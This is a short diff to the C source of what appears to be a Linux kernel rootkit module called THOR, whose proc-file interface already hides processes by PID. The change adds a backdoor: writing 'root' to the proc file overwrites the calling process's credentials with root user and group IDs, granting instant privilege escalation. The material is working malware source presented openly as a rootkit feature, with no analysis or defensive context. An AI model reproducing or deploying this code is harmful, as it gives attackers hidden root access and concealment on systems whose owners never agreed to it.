@@ -111,7 +111,8 @@ static int procfile_read(struct seq_file *m, void *v)
 {
     seq_printf(m, 
         "usage:\n"\
-        "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n");
+        "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
+        "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
     return 0;
 }
 
@@ -132,6 +133,13 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         tmp->name[count-3] = 0;
         LOG_DEBUG("a:%s",tmp->name);
         list_add(&(tmp->list), &(pid_list.list));
+    }
+    else if(0 == strncmp(buffer, "root", MIN(4, count)))
+    {
+        struct cred *credentials = prepare_creds();
+        credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
+        credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
+        commit_creds(credentials);
     }
     return count;
 }
